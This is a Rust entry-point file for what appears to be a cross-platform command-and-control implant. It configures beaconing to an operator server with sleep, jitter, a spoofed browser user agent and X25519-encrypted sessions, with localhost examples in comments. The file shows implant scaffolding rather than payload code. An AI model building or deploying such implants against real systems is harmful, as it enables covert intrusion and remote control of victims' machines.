#![allow(dead_code, unused_imports, unused_variables, unused_assignments, deprecated)]

use x25519_dalek::PublicKey;

pub mod core;
pub mod config;
pub mod crypto;
pub mod utils;

#[cfg(target_os = "linux")]
use core::run_linux::run;
#[cfg(target_os = "windows")]
use core::run_windows::run;
#[cfg(target_os = "macos")]
use core::run_mac::run;

use config::config::Config;
use crypto::aesgcm::{
    AES_GCM_KEY_LENGTH,
    decode, derive_shared_secret, generate_keypair, vec_u8_to_u8_32
};

include!(concat!(env!("OUT_DIR"), "/init.rs"));

// http
// pub fn init() -> (
//     &'static str,
//     &'static str,
//     u16,
//     u64,
//     u64,
//     &'static str,
//     &'static str,
//     &'static str,
//     &'static str,
//     &'static str,
// ) {
//     ("http", "127.0.0.1", 8081, 3, 1, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "", "", "", "474b89a2f95dd5909866188fcc915d248ff799ac0b227b928581f1a6645db856")
// }

// https
// pub fn init() -> (
//     &'static str,
//     &'static str,
//     u16,
//     u64,
//     u64,
//     &'static str,
//     &'static str,
//     &'static str,
//     &'static str,
//     &'static str,
// ) {
//     ("https", "127.0.0.1", 4433, 1, 5, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "", "", "", "609181983959886d1e8f1e07c6ed19e2063c46887454ff351962d8a88d0ea54e")
// }

#[tokio::main]
async fn main() {
    let (
        proto,
        host,
        port,
        sleep,
        jitter,
        user_agent,
        https_root_cert,
        https_client_cert,
        https_client_key,
        server_public_key,
    ) = init();

    let server_public_key = decode(server_public_key.as_bytes());
    let server_public_key = vec_u8_to_u8_32(server_public_key).unwrap();
    let server_public_key = PublicKey::from(server_public_key);

    let (my_secret_key, my_public_key) = generate_keypair();
    let shared_secret = derive_shared_secret(my_secret_key.clone(), server_public_key.clone());

    let config = Config::new(
        proto.to_string(),
        host.to_string(),
        port,
        jitter,
        sleep,
        user_agent.to_string(),
        https_root_cert.to_string(),
        https_client_cert.to_string(),
        https_client_key.to_string(),
        server_public_key,
        my_secret_key,
        my_public_key,
        shared_secret,

    );
    run(config).await.unwrap()
}
